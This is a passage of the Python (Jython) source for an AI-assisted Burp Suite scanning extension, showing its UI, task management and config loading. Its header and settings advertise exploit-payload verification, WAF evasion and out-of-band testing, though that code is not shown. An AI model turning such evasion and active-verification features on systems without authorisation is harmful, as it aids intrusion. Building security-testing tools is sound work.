# -*- coding: utf-8 -*-
# Burp Suite Python Extension: Code-AIxBurp
# Version: 1.2.0
# Release Date: 2026-03-10
# License: MIT License
# Build-ID: bb90850f-1d2e-4d12-852e-842527475b37
#
# AI-Powered Security Scanner
#
# This extension provides:
# - AI-powered passive security analysis
# - OWASP Top 10 vulnerability detection
# - Real-time threat identification
# - Professional reporting with CWE/OWASP mappings
#
# Advanced Edition Features Included:
# - Phase 2 active verification with exploit payloads
# - WAF detection and evasion
# - Advanced payload libraries
# - Out-of-band (OOB) testing
# - Automated fuzzing with Burp Intruder integration
#
# Changelog:
# v1.2.0 (2026-03-10) - Added WAF detection/evasion, advanced payload libraries, OOB collaborator testing, and Intruder automation
# v1.1.1 (2025-02-04) - Fix Settings freeze and slow startup: move network calls off EDT to background threads
# v1.1.0 (2025-02-04) - Fix UI hang on Linux: dirty-flag refresh guard, incremental console, remove EDT lock contention
# v1.0.9 (2025-02-02) - Skip static files (js,css,images,fonts), passive scan toggle, taller Settings dialog
# v1.0.8 (2025-01-31) - Minor fixes and improvements
# v1.0.7 (2025-01-31) - Removed Unicode chars, widened Settings dialog
# v1.0.6 (2025-01-31) - Fixed UTF-8 decode errors, timeout max 99999s, moved Debug to Settings
# v1.0.5 (2025-01-31) - Persistent config, equal window sizing, robust JSON parsing
# v1.0.4 (2025-01-31) - Added Cancel/Pause All, Debug Tasks, auto stuck detection
# v1.0.3 (2025-01-31) - Fixed context menu forced re-analysis
# v1.0.2 (2025-01-31) - Fixed unicode format errors, improved error handling
# v1.0.1 (2025-01-31) - Added configurable timeout, retry logic
# v1.0.0 (2025-01-31) - Initial stable release

from burp import (
    IBurpExtender,
    IHttpListener,
    IScannerCheck,
    IScanIssue,
    ITab,
    IContextMenuFactory,
    IIntruderPayloadGeneratorFactory,
    IIntruderPayloadGenerator,
)
from java.io import PrintWriter
from java.awt import (
    BorderLayout,
    GridBagLayout,
    GridBagConstraints,
    Insets,
    Dimension,
    Font,
    Color,
    FlowLayout,
)
from javax.swing import (
    JPanel,
    JScrollPane,
    JTextArea,
    JTable,
    JLabel,
    JSplitPane,
    BorderFactory,
    SwingUtilities,
    JButton,
    BoxLayout,
    Box,
    JMenuItem,
    JPopupMenu,
)
from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer
from java.lang import Runnable
from java.util import ArrayList
import json
import threading
import urllib2
import time
import hashlib
from jarray import array as jarray_array
from datetime import datetime

VALID_SEVERITIES = {
    "high": "High",
    "medium": "Medium",
    "low": "Low",
    "information": "Information",
    "informational": "Information",
    "info": "Information",
    "inform": "Information",
}


def map_confidence(ai_confidence):
    if ai_confidence < 50:
        return None
    elif ai_confidence < 75:
        return "Tentative"
    elif ai_confidence < 90:
        return "Firm"
    else:
        return "Certain"


# Custom PrintWriter wrapper to capture console output
class ConsolePrintWriter:
    def __init__(self, original_writer, extender_ref):
        self.original = original_writer
        self.extender = extender_ref

    def println(self, message):
        self.original.println(message)
        if hasattr(self.extender, "log_to_console"):
            try:
                self.extender.log_to_console(str(message))
            except:
                pass

    def print_(self, message):
        self.original.print_(message)

    def write(self, data):
        self.original.write(data)

    def flush(self):
        self.original.flush()


class BurpExtender(
    IBurpExtender,
    IHttpListener,
    IScannerCheck,
    ITab,
    IContextMenuFactory,
    IIntruderPayloadGeneratorFactory,
):
    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()

        # Store original writers
        original_stdout = PrintWriter(callbacks.getStdout(), True)
        original_stderr = PrintWriter(callbacks.getStderr(), True)

        # Wrap to capture console output
        self.stdout = ConsolePrintWriter(original_stdout, self)
        self.stderr = ConsolePrintWriter(original_stderr, self)

        # Version Information
        self.VERSION = "1.2.0"
        self.EDITION = ""
        self.RELEASE_DATE = "2026-03-10"
        self.BUILD_ID = "bb90850f-1d2e-4d12-852e-842527475b37"

        callbacks.setExtensionName("Code-AIxBurp")
        callbacks.registerHttpListener(self)
        callbacks.registerScannerCheck(self)
        callbacks.registerContextMenuFactory(self)

        # Configuration file path (in user's home directory)
        import os

        self.config_file = os.path.join(
            os.path.expanduser("~"), ".code_aixburp_config.json"
        )

        # AI Provider Settings (defaults - will be overridden by saved config)
        self.AI_PROVIDER = "Ollama"  # Options: Ollama, OpenAI, Claude, Gemini, OpenAI Compatible
        self.API_URL = "http://localhost:11434"
        self.API_KEY = ""  # For OpenAI, Claude, Gemini
        self.MODEL = "deepseek-r1:latest"
        self.MAX_TOKENS = 2048
        self.AI_REQUEST_TIMEOUT = 60  # Timeout for AI requests in seconds (default: 60)
        self.VERIFICATION_AI_TEMPERATURE = 0.2  # Slight creativity for verification payload generation
        self.available_models = []

        self.VERBOSE = True
        self.THEME = "Light"  # Options: Light, Dark
        self.PASSIVE_SCANNING_ENABLED = (
            True  # Enable/disable passive scanning (context menu still works)
        )
        self.ENABLE_WAF_DETECTION = True
        self.ENABLE_WAF_EVASION = True
        self.ENABLE_ADVANCED_PAYLOADS = True
        self.ENABLE_OOB_TESTING = True
        self.ENABLE_INTRUDER_AUTOMATION = True
        self.MAX_VERIFICATION_ATTEMPTS = 4
        self.OOB_POLL_SECONDS = 18

        # File extensions to skip during analysis (static/non-security-relevant files)
        self.SKIP_EXTENSIONS = [
            "js",
            "gif",
            "jpg",
            "png",
            "ico",
            "css",
            "woff",
            "woff2",
            "ttf",
            "svg",
        ]

        # Runtime state for enhanced testing features
        self.waf_profiles = {}
        self.waf_lock = threading.Lock()
        self.collaborator_contexts = {}
        self.collaborator_lock = threading.Lock()
        self.intruder_payload_factory_registered = False

        # Load saved configuration (if exists)
        self.load_config()
        self.advanced_payload_library = self._build_advanced_payload_library()

        # UI refresh control
        self._ui_dirty = True  # Flag: data changed since last refresh
        self._refresh_pending = False  # Guard: refresh already queued on EDT
        self._last_console_len = 0  # Track console length for incremental append

        # Console tracking for UI panel
        self.console_messages = []
        self.console_lock = threading.Lock()
        self.max_console_messages = 1000

        # Findings tracking for Findings panel
        self.findings_list = []
        self.findings_lock_ui = threading.Lock()

        self.findings_cache = {}
        self.findings_lock = threading.Lock()

        # Context menu debounce
        self.context_menu_last_invoke = {}
        self.context_menu_debounce_time = 1.0
        self.context_menu_lock = threading.Lock()

        self.processed_urls = set()
        self.url_lock = threading.Lock()
        self.semaphore = threading.Semaphore(1)
        self.last_request_time = 0
        self.min_delay = 4.0

        # Task tracking
        self.tasks = []
        self.tasks_lock = threading.Lock()
        self.stats = {
            "total_requests": 0,
            "analyzed": 0,
            "skipped_duplicate": 0,
            "skipped_rate_limit": 0,
            "skipped_low_confidence": 0,
            "findings_created": 0,
            "errors": 0,
            "waf_detected": 0,
            "oob_interactions": 0,
            "intruder_launches": 0,
        }
        self.stats_lock = threading.Lock()

        # Create UI
        self.initUI()

        self.log_to_console("=== Code-AIxBurp Initialized ===")
        self.log_to_console("Console panel is active and logging...")

        # Force immediate UI refresh
        self.refreshUI()

        # Display logo
        self.print_logo()

        self.stdout.println(
            "[+] Version: %s (Released: %s)" % (self.VERSION, self.RELEASE_DATE)
        )
        self.stdout.println("[+] AI Provider: %s" % self.AI_PROVIDER)
        self.stdout.println("[+] API URL: %s" % self.API_URL)
        self.stdout.println("[+] Model: %s" % self.MODEL)
        self.stdout.println("[+] Max Tokens: %d" % self.MAX_TOKENS)
        self.stdout.println("[+] Request Timeout: %d seconds" % self.AI_REQUEST_TIMEOUT)
        self.stdout.println("[+] Deduplication: ENABLED")
        self.stdout.println(
            "[+] WAF Detection/Evasion: %s/%s"
            % (
                "ON" if self.ENABLE_WAF_DETECTION else "OFF",
                "ON" if self.ENABLE_WAF_EVASION else "OFF",
            )
        )
        self.stdout.println(
            "[+] Advanced Payloads: %s | OOB: %s | Intruder Automation: %s"
            % (
                "ON" if self.ENABLE_ADVANCED_PAYLOADS else "OFF",
                "ON" if self.ENABLE_OOB_TESTING else "OFF",
                "ON" if self.ENABLE_INTRUDER_AUTOMATION else "OFF",
            )
        )
        self.stdout.println("")
        self.stdout.println("[*] Enhanced verification modules enabled")

        # Test AI connection in background thread (non-blocking startup)
        def _startup_connection_test():
            connection_ok = self.test_ai_connection()
            if not connection_ok:
                self.stderr.println("\n[!] WARNING: AI connection test failed!")
                self.stderr.println(
                    "[!] Extension will not function properly until connection is established."
                )
                self.stderr.println(
                    "[!] Please check Settings and verify your AI configuration."
                )

        _conn_thread = threading.Thread(target=_startup_connection_test)
        _conn_thread.setDaemon(True)
        _conn_thread.start()

        # Add UI tab
        callbacks.addSuiteTab(self)

        # Register Intruder payload factory
        self._sync_intruder_payload_factory()

        # Start auto-refresh timer for Console
        self.start_auto_refresh_timer()

    def initUI(self):
        # Main panel
        self.panel = JPanel(BorderLayout())

        # Top panel with stats
        topPanel = JPanel()
        topPanel.setLayout(BoxLayout(topPanel, BoxLayout.Y_AXIS))
        topPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        # Title
        titleLabel = JLabel("Code-AIxBurp")
        titleLabel.setFont(Font("Monospaced", Font.BOLD, 16))
        titlePanel = JPanel()
        titlePanel.add(titleLabel)
        topPanel.add(titlePanel)

        # Edition notice
        editionLabel = JLabel(
            "AI-Powered OWASP Top 10 Vulnerability Scanning for Burp Suite"
        )
        editionLabel.setFont(Font("Dialog", Font.ITALIC, 12))
        editionLabel.setForeground(Color(0xD5, 0x59, 0x35))
        editionPanel = JPanel()
        editionPanel.add(editionLabel)
        topPanel.add(editionPanel)

        topPanel.add(Box.createRigidArea(Dimension(0, 10)))

        # Stats panel
        statsPanel = JPanel(GridBagLayout())
        statsPanel.setBorder(BorderFactory.createTitledBorder("Statistics"))
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 10, 5, 10)
        gbc.anchor = GridBagConstraints.WEST

        self.statsLabels = {}
        statNames = [
            ("total_requests", "Total Requests:"),
            ("analyzed", "Analyzed:"),
            ("skipped_duplicate", "Skipped (Duplicate):"),
            ("skipped_rate_limit", "Skipped (Rate Limit):"),
            ("skipped_low_confidence", "Skipped (Low Confidence):"),
            ("findings_created", "Findings Created:"),
            ("errors", "Errors:"),
            ("waf_detected", "WAF Detected:"),
            ("oob_interactions", "OOB Hits:"),
            ("intruder_launches", "Intruder Launches:"),
        ]

        row = 0
        for key, label in statNames:
            gbc.gridx = (row % 4) * 2
            gbc.gridy = row / 4
            statsPanel.add(JLabel(label), gbc)

            gbc.gridx = (row % 4) * 2 + 1
            valueLabel = JLabel("0")
            valueLabel.setFont(Font("Monospaced", Font.BOLD, 12))
            statsPanel.add(valueLabel, gbc)
            self.statsLabels[key] = valueLabel
            row += 1

        topPanel.add(statsPanel)

        # Control panel
        controlPanel = JPanel()

        # Settings button
        self.settingsButton = JButton("Settings", actionPerformed=self.openSettings)

        self.clearButton = JButton(
            "Clear Completed", actionPerformed=self.clearCompleted
        )

        # Cancel/Pause all buttons (kill switches)
        self.cancelAllButton = JButton(
            "Cancel All Tasks", actionPerformed=self.cancelAllTasks
        )

        self.pauseAllButton = JButton(
            "Pause All Tasks", actionPerformed=self.pauseAllTasks
        )

        # Updates button
        self.upgradeButton = JButton(
            "Project Updates", actionPerformed=self.openUpgradePage
        )
        self.upgradeButton.setBackground(Color(0xD5, 0x59, 0x35))
        self.upgradeButton.setForeground(Color.WHITE)
        self.upgradeButton.setOpaque(True)

        controlPanel.add(self.settingsButton)
        controlPanel.add(self.clearButton)
        controlPanel.add(self.cancelAllButton)
        controlPanel.add(self.pauseAllButton)
        controlPanel.add(self.upgradeButton)
        topPanel.add(controlPanel)

        self.panel.add(topPanel, BorderLayout.NORTH)

        # Split pane for tasks and findings - equal sizing (33.33% each)
        splitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        splitPane.setResizeWeight(0.33)  # Tasks get 33%

        # Task table
        taskPanel = JPanel(BorderLayout())
        taskPanel.setBorder(BorderFactory.createTitledBorder("Active Tasks"))

        self.taskTableModel = DefaultTableModel()
        self.taskTableModel.addColumn("Timestamp")
        self.taskTableModel.addColumn("Type")
        self.taskTableModel.addColumn("URL")
        self.taskTableModel.addColumn("Status")
        self.taskTableModel.addColumn("Duration")

        self.taskTable = JTable(self.taskTableModel)
        self.taskTable.setAutoCreateRowSorter(True)
        self.taskTable.getColumnModel().getColumn(0).setPreferredWidth(150)
        self.taskTable.getColumnModel().getColumn(1).setPreferredWidth(120)
        self.taskTable.getColumnModel().getColumn(2).setPreferredWidth(300)
        self.taskTable.getColumnModel().getColumn(3).setPreferredWidth(130)
        self.taskTable.getColumnModel().getColumn(4).setPreferredWidth(80)

        # Color renderer for status
        statusRenderer = StatusCellRenderer()
        self.taskTable.getColumnModel().getColumn(3).setCellRenderer(statusRenderer)

        taskScrollPane = JScrollPane(self.taskTable)
        taskPanel.add(taskScrollPane, BorderLayout.CENTER)

        splitPane.setTopComponent(taskPanel)

        # Findings Panel
        findingsPanel = JPanel(BorderLayout())
        findingsPanel.setBorder(BorderFactory.createTitledBorder("Findings"))

        # Findings stats
        findingsStatsPanel = JPanel(FlowLayout(FlowLayout.LEFT))
        self.findingsStatsLabel = JLabel(
            "Total: 0 | High: 0 | Medium: 0 | Low: 0 | Info: 0"
        )
        self.findingsStatsLabel.setFont(Font("Monospaced", Font.BOLD, 11))
        findingsStatsPanel.add(self.findingsStatsLabel)

        # Quick verification actions
        findingsStatsPanel.add(Box.createHorizontalStrut(12))
        verifySelectedButton = JButton("Verify Selected")
        verifySelectedButton.addActionListener(lambda e: self._verifySelectedFinding())
        findingsStatsPanel.add(verifySelectedButton)

        verifyPendingButton = JButton("Verify Pending")
        verifyPendingButton.addActionListener(
            lambda e: self._verifyAllPendingFindings()
        )
        findingsStatsPanel.add(verifyPendingButton)
        findingsPanel.add(findingsStatsPanel, BorderLayout.NORTH)

        self.findingsTableModel = DefaultTableModel()
        self.findingsTableModel.addColumn("Discovered At")
        self.findingsTableModel.addColumn("URL")
        self.findingsTableModel.addColumn("Finding")
        self.findingsTableModel.addColumn("Severity")
        self.findingsTableModel.addColumn("Confidence")
        self.findingsTableModel.addColumn("Verification")

        self.findingsTable = JTable(self.findingsTableModel)
        self.findingsTable.setAutoCreateRowSorter(True)
        self.findingsTable.getColumnModel().getColumn(0).setPreferredWidth(130)
        self.findingsTable.getColumnModel().getColumn(1).setPreferredWidth(280)
        self.findingsTable.getColumnModel().getColumn(2).setPreferredWidth(230)
        self.findingsTable.getColumnModel().getColumn(3).setPreferredWidth(70)
        self.findingsTable.getColumnModel().getColumn(4).setPreferredWidth(80)
        self.findingsTable.getColumnModel().getColumn(5).setPreferredWidth(80)

        # Color renderers
        severityRenderer = SeverityCellRenderer()
        confidenceRenderer = ConfidenceCellRenderer()
        verifiedRenderer = VerifiedCellRenderer()

        self.findingsTable.getColumnModel().getColumn(3).setCellRenderer(
            severityRenderer
        )
        self.findingsTable.getColumnModel().getColumn(4).setCellRenderer(
            confidenceRenderer
        )
        self.findingsTable.getColumnModel().getColumn(5).setCellRenderer(
            verifiedRenderer
        )

        # Add right-click context menu for verification
        self.findingsTable.setComponentPopupMenu(self._createFindingsPopupMenu())
        self._installFindingsTableMouseHandler()

        findingsScrollPane = JScrollPane(self.findingsTable)
        findingsPanel.add(findingsScrollPane, BorderLayout.CENTER)

        # Create nested split pane for Findings and Console - equal sizing
        bottomSplitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        bottomSplitPane.setResizeWeight(
            0.50
        )  # Findings and Console split 50/50 of bottom 66%
        bottomSplitPane.setTopComponent(findingsPanel)

        # Console Panel
        consolePanel = JPanel(BorderLayout())
        consolePanel.setBorder(BorderFactory.createTitledBorder("Console"))

        self.consoleTextArea = JTextArea()
        self.consoleTextArea.setEditable(False)
        self.consoleTextArea.setFont(Font("Monospaced", Font.PLAIN, 13))
        self.consoleTextArea.setLineWrap(True)
        self.consoleTextArea.setWrapStyleWord(False)

        # Apply theme colors
        self.applyConsoleTheme()

        consoleScrollPane = JScrollPane(self.consoleTextArea)
        consoleScrollPane.setVerticalScrollBarPolicy(
            JScrollPane.VERTICAL_SCROLLBAR_ALWAYS
        )

        self.console_user_scrolled = False

        from java.awt.event import AdjustmentListener

        class ScrollListener(AdjustmentListener):
            def __init__(self, extender):
                self.extender = extender
                self.last_value = 0

            def adjustmentValueChanged(self, e):
                scrollbar = e.getAdjustable()
                current_value = scrollbar.getValue()
                max_value = scrollbar.getMaximum() - scrollbar.getVisibleAmount()

                if current_value < max_value - 10:
                    self.extender.console_user_scrolled = True
                else:
                    self.extender.console_user_scrolled = False

        consoleScrollPane.getVerticalScrollBar().addAdjustmentListener(
            ScrollListener(self)
        )

        consolePanel.add(consoleScrollPane, BorderLayout.CENTER)

        bottomSplitPane.setBottomComponent(consolePanel)

        splitPane.setBottomComponent(bottomSplitPane)

        self.panel.add(splitPane, BorderLayout.CENTER)

        # Store references for divider positioning
        self.mainSplitPane = splitPane
        self.bottomSplitPane = bottomSplitPane

        # Add component listener to set equal 33% splits when panel is shown
        from java.awt.event import ComponentAdapter

        class SplitPaneInitializer(ComponentAdapter):
            def __init__(self, extender):
                self.extender = extender
                self.initialized = False

            def componentResized(self, e):
                if not self.initialized and self.extender.panel.getHeight() > 0:
                    self.initialized = True
                    # Calculate 33% splits based on actual panel height
                    total_height = self.extender.panel.getHeight()
                    third = total_height / 3

                    # Set main split: Tasks gets top 33%
                    self.extender.mainSplitPane.setDividerLocation(int(third))

                    # Set bottom split: Findings and Console each get 50% of remaining 66%
                    # This means each gets 33% of total
                    self.extender.bottomSplitPane.setDividerLocation(int(third))

        self.panel.addComponentListener(SplitPaneInitializer(self))

    def applyConsoleTheme(self):
        """Apply theme colors to console"""
        if self.THEME == "Dark":
            # Dark theme: Charcoal background with light grey text
            self.consoleTextArea.setBackground(Color(0x32, 0x33, 0x34))  # #323334
            self.consoleTextArea.setForeground(Color(0x7D, 0xA3, 0x58))  # #7DA358
        else:
            # Light theme (default): White background with charcoal text
            self.consoleTextArea.setBackground(Color.WHITE)
            self.consoleTextArea.setForeground(
                Color(0x36, 0x45, 0x4F)
            )  # Charcoal #36454F

    def refreshUI(self, event=None):
        # Skip if a refresh is already queued on the EDT
        if self._refresh_pending:
            return
        # Skip if nothing changed since last refresh
        if not self._ui_dirty:
            return

        class RefreshRunnable(Runnable):
            def __init__(self, extender):
                self.extender = extender

            def run(self):
                try:
                    # --- Copy data out of locks (fast) ---
                    with self.extender.stats_lock:
                        stats_snapshot = dict(self.extender.stats)

                    with self.extender.tasks_lock:
                        tasks_snapshot = []
                        for task in self.extender.tasks[-100:]:
                            duration = ""
                            if task.get("end_time"):
                                duration = "%.2fs" % (
                                    task["end_time"] - task["start_time"]
                                )
                            elif task.get("start_time"):
                                duration = "%.2fs" % (time.time() - task["start_time"])
                            tasks_snapshot.append(
                                [
                                    task.get("timestamp", ""),
                                    task.get("type", ""),
                                    task.get("url", "")[:100],
                                    task.get("status", ""),
                                    duration,
                                ]
                            )

                    with self.extender.findings_lock_ui:
                        findings_snapshot = []
                        severity_counts = {
                            "High": 0,
                            "Medium": 0,
                            "Low": 0,
                            "Information": 0,
                        }
                        total_findings = 0
                        for finding in self.extender.findings_list:
                            total_findings += 1
                            severity = finding.get("severity", "Information")
                            if severity in severity_counts:
                                severity_counts[severity] += 1
                            findings_snapshot.append(
                                [
                                    finding.get("discovered_at", ""),
                                    finding.get("url", "")[:100],
                                    finding.get("title", "")[:50],
                                    severity,
                                    finding.get("confidence", ""),
                                    finding.get("verified", "Pending"),
                                ]
                            )

                    with self.extender.console_lock:
                        current_len = len(self.extender.console_messages)
                        prev_len = self.extender._last_console_len
                        if current_len != prev_len:
                            new_messages = list(
                                self.extender.console_messages[prev_len:]
                            )
                            console_changed = True
                        else:
                            new_messages = []
                            console_changed = False
                        # Handle case where messages were trimmed (list shortened)
                        if current_len < prev_len:
                            console_changed = True
                            new_messages = list(self.extender.console_messages)
                            prev_len = 0

                    # --- Update Swing components (no locks held) ---

                    # Stats
                    for key, label in self.extender.statsLabels.items():
                        label.setText(str(stats_snapshot.get(key, 0)))

                    # Task table
                    self.extender.taskTableModel.setRowCount(0)
                    for row in tasks_snapshot:
                        self.extender.taskTableModel.addRow(row)

                    # Findings table
                    self.extender.findingsTableModel.setRowCount(0)
                    for row in findings_snapshot:
                        self.extender.findingsTableModel.addRow(row)

                    self.extender.findingsStatsLabel.setText(
                        "Total: %d | High: %d | Medium: %d | Low: %d | Info: %d"
                        % (
                            total_findings,
                            severity_counts["High"],
                            severity_counts["Medium"],
                            severity_counts["Low"],
                            severity_counts["Information"],
                        )
                    )

                    # Console — incremental append
                    if console_changed:
                        if prev_len == 0:
                            # Full rebuild (first load or after trim)
                            console_text = "\n".join(new_messages)
                            self.extender.consoleTextArea.setText(console_text)
                        else:
                            # Append only new messages
                            doc = self.extender.consoleTextArea.getDocument()
                            append_text = "\n" + "\n".join(new_messages)
                            doc.insertString(doc.getLength(), append_text, None)

                        self.extender._last_console_len = current_len

                        was_scrolled = self.extender.console_user_scrolled
                        if not was_scrolled:
                            try:
                                doc = self.extender.consoleTextArea.getDocument()
                                self.extender.consoleTextArea.setCaretPosition(
                                    doc.getLength()
                                )
                            except:
                                pass

                finally:
                    self.extender._refresh_pending = False

        self._ui_dirty = False
        self._refresh_pending = True
        SwingUtilities.invokeLater(RefreshRunnable(self))

    def start_auto_refresh_timer(self):
        """Auto-refresh UI and check for stuck tasks"""

        def refresh_timer():
            check_interval = 0
            while True:
                time.sleep(5)
                self.refreshUI()

                # Check for stuck tasks periodically (every ~30 seconds)
                check_interval += 1
                if check_interval >= 6:
                    check_interval = 0
                    self.check_stuck_tasks()

        timer_thread = threading.Thread(target=refresh_timer)
        timer_thread.setDaemon(True)
        timer_thread.start()

    def check_stuck_tasks(self):
        """Automatically check for stuck tasks and log warnings"""
        current_time = time.time()
        stuck_found = False

        with self.tasks_lock:
            for idx, task in enumerate(self.tasks):
                status = task.get("status", "")
                start_time = task.get("start_time", 0)

                # Check if task has been analyzing for >5 minutes
                if ("Analyzing" in status or "Waiting" in status) and start_time > 0:
                    duration = current_time - start_time

                    if duration > 300:  # 5 minutes
                        if not stuck_found:
                            self.stderr.println(
                                "\n[AUTO-CHECK] WARNING: STUCK TASK DETECTED"
                            )
                            stuck_found = True

                        task_type = task.get("type", "Unknown")
                        url = task.get("url", "Unknown")[:50]
                        self.stderr.println(
                            "[AUTO-CHECK] Task %d stuck: %s | %.1f min | %s"
                            % (idx, task_type, duration / 60, url)
                        )

        if stuck_found:
            self.stderr.println(
                "[AUTO-CHECK] Run 'Debug Tasks' button for detailed diagnostics"
            )
            self.stderr.println(
                "[AUTO-CHECK] Or click 'Cancel All Tasks' to clear stuck tasks"
            )

    def clearCompleted(self, event):
        with self.tasks_lock:
            self.tasks = [
                t
                for t in self.tasks
                if not (
                    t.get("status") == "Completed"
                    or "Skipped" in t.get("status", "")
                    or "Error" in t.get("status", "")
                )
            ]
        self.refreshUI()

    def cancelAllTasks(self, event):
        """Cancel all running/queued tasks (kill switch)"""
        self.stdout.println("\n[CANCEL ALL] Cancelling all active tasks...")

        cancelled_count = 0
        with self.tasks_lock:
            for task in self.tasks:
                status = task.get("status", "")
                # Cancel anything that's not already done
                if (
                    "Completed" not in status
                    and "Error" not in status
                    and "Cancelled" not in status
                ):
                    task["status"] = "Cancelled"
                    task["end_time"] = time.time()
                    cancelled_count += 1

        self.stdout.println("[CANCEL ALL] Cancelled %d tasks" % cancelled_count)
        self.refreshUI()

    def pauseAllTasks(self, event):
        """Pause/Resume all running tasks"""
        # Check if any tasks are currently paused to determine toggle direction
        paused_count = 0
        active_count = 0

        with self.tasks_lock:
            for task in self.tasks:
                status = task.get("status", "")
                if "Paused" in status:
                    paused_count += 1
                elif "Analyzing" in status or "Queued" in status or "Waiting" in status:
                    active_count += 1

        # If more tasks are active than paused, pause all. Otherwise, resume all.
        if active_count > paused_count:
            # Pause all active tasks
            self.stdout.println("\n[PAUSE ALL] Pausing all active tasks...")
            with self.tasks_lock:
                for task in self.tasks:
                    status = task.get("status", "")
                    if (
                        "Analyzing" in status
                        or "Queued" in status
                        or "Waiting" in status
                    ):
                        task["status"] = "Paused"
            self.stdout.println("[PAUSE ALL] All tasks paused")
        else:
            # Resume all paused tasks
            self.stdout.println("\n[RESUME ALL] Resuming all paused tasks...")
            with self.tasks_lock:
                for task in self.tasks:
                    status = task.get("status", "")
                    if "Paused" in status:
                        task["status"] = "Analyzing"
            self.stdout.println("[RESUME ALL] All tasks resumed")

        self.refreshUI()

    def debugTasks(self, event):
        """Debug stuck/stalled tasks - provides detailed diagnostic information"""
        self.stdout.println("\n" + "=" * 60)
        self.stdout.println("[DEBUG] Task Status Diagnostic Report")
        self.stdout.println("=" * 60)

        current_time = time.time()

        with self.tasks_lock:
            total_tasks = len(self.tasks)
            active_tasks = []
            queued_tasks = []
            stuck_tasks = []

            for idx, task in enumerate(self.tasks):
                status = task.get("status", "Unknown")
                task_type = task.get("type", "Unknown")
                url = task.get("url", "Unknown")[:50]
                start_time = task.get("start_time", 0)

                # Calculate duration
                if start_time > 0:
                    duration = current_time - start_time
                else:
                    duration = 0

                # Categorize tasks
                if "Analyzing" in status or "Waiting" in status:
                    active_tasks.append((idx, task_type, status, duration, url))

                    # Check if stuck (analyzing for >5 minutes)
                    if duration > 300:  # 5 minutes
                        stuck_tasks.append((idx, task_type, status, duration, url))

                elif "Queued" in status:
                    queued_tasks.append((idx, task_type, status, duration, url))

            # Print summary
            self.stdout.println("\n[DEBUG] Summary:")
            self.stdout.println("  Total Tasks: %d" % total_tasks)
            self.stdout.println("  Active (Analyzing/Waiting): %d" % len(active_tasks))
            self.stdout.println("  Queued: %d" % len(queued_tasks))
            self.stdout.println("  Stuck (>5 min): %d" % len(stuck_tasks))

            # Print active tasks
            if active_tasks:
                self.stdout.println("\n[DEBUG] Active Tasks:")
                for idx, task_type, status, duration, url in active_tasks[
                    :10
                ]:  # Show first 10
                    self.stdout.println(
                        "  [%d] %s | %s | %.1fs | %s"
                        % (idx, task_type, status, duration, url)
                    )

            # Print queued tasks
            if queued_tasks:
                self.stdout.println("\n[DEBUG] Queued Tasks:")
                for idx, task_type, status, duration, url in queued_tasks[:10]:
                    self.stdout.println(
                        "  [%d] %s | %s | %.1fs | %s"
                        % (idx, task_type, status, duration, url)
                    )

            # Print stuck tasks with detailed diagnostics
            if stuck_tasks:
                self.stdout.println("\n[DEBUG] WARNING: STUCK TASKS DETECTED:")
                for idx, task_type, status, duration, url in stuck_tasks:
                    self.stdout.println(
                        "  [%d] %s | %s | %.1f minutes | %s"
                        % (idx, task_type, status, duration / 60, url)
                    )

                self.stdout.println("\n[DEBUG] Possible causes:")
                self.stdout.println("  1. AI request timeout (increase in Settings)")
                self.stdout.println("  2. Network issues (check connectivity)")
                self.stdout.println("  3. AI provider unavailable (test connection)")
                self.stdout.println("  4. Thread deadlock (restart Burp Suite)")
                self.stdout.println("\n[DEBUG] Recommended actions:")
                self.stdout.println("  - Click 'Cancel All Tasks' to clear stuck tasks")
                self.stdout.println(
                    "  - Check AI connection: Settings → Test Connection"
                )
                self.stdout.println(
                    "  - Increase timeout: Settings → Advanced → AI Request Timeout"
                )
                self.stdout.println("  - Check Console for error messages")

            # Check semaphore status
            self.stdout.println("\n[DEBUG] Threading Status:")
            self.stdout.println("  Rate Limit Delay: %.1fs" % self.min_delay)
            self.stdout.println(
                "  Last Request: %.1fs ago" % (current_time - self.last_request_time)
            )

            # Check if semaphore might be blocked
            if len(active_tasks) > 0 and len(queued_tasks) > 5:
                self.stdout.println(
                    "\n[DEBUG] Warning: Many queued tasks with active task"
                )
                self.stdout.println(
                    "  This is normal - tasks are rate-limited to prevent API overload"
                )
                self.stdout.println(
                    "  Current rate: 1 task every %.1f seconds" % self.min_delay
                )

        self.stdout.println("\n" + "=" * 60)
        self.stdout.println("[DEBUG] End of diagnostic report")
        self.stdout.println("=" * 60)

        self.refreshUI()

    def load_config(self):
        """Load configuration from disk"""
        try:
            import os

            if os.path.exists(self.config_file):
                with open(self.config_file, "r") as f:
                    config = json.load(f)

                # Load settings
                self.AI_PROVIDER = config.get("ai_provider", self.AI_PROVIDER)
                self.API_URL = config.get("api_url", self.API_URL)
                self.API_KEY = config.get("api_key", self.API_KEY)
                self.MODEL = config.get("model", self.MODEL)
                self.MAX_TOKENS = config.get("max_tokens", self.MAX_TOKENS)
                self.AI_REQUEST_TIMEOUT = config.get(
                    "ai_request_timeout", self.AI_REQUEST_TIMEOUT
                )
                self.VERBOSE = config.get("verbose", self.VERBOSE)
                saved_theme = config.get("theme", self.THEME)
                self.THEME = (
                    saved_theme if saved_theme in ("Light", "Dark") else "Light"
                )
                self.PASSIVE_SCANNING_ENABLED = config.get(
                    "passive_scanning_enabled", self.PASSIVE_SCANNING_ENABLED
                )
                self.ENABLE_WAF_DETECTION = config.get(
                    "enable_waf_detection", self.ENABLE_WAF_DETECTION
                )
                self.ENABLE_WAF_EVASION = config.get(
                    "enable_waf_evasion", self.ENABLE_WAF_EVASION
                )
                self.ENABLE_ADVANCED_PAYLOADS = config.get(
                    "enable_advanced_payloads", self.ENABLE_ADVANCED_PAYLOADS
                )
                self.ENABLE_OOB_TESTING = config.get(
                    "enable_oob_testing", self.ENABLE_OOB_TESTING
                )
                self.ENABLE_INTRUDER_AUTOMATION = config.get(
                    "enable_intruder_automation", self.ENABLE_INTRUDER_AUTOMATION
                )
                self.MAX_VERIFICATION_ATTEMPTS = int(
                    config.get(
                        "max_verification_attempts", self.MAX_VERIFICATION_ATTEMPTS
                    )
                )
                self.OOB_POLL_SECONDS = int(
                    config.get("oob_poll_seconds", self.OOB_POLL_SECONDS)
                )

                self.stdout.println(
                    "\n[CONFIG] Loaded saved configuration from %s" % self.config_file
                )
                self.stdout.println(
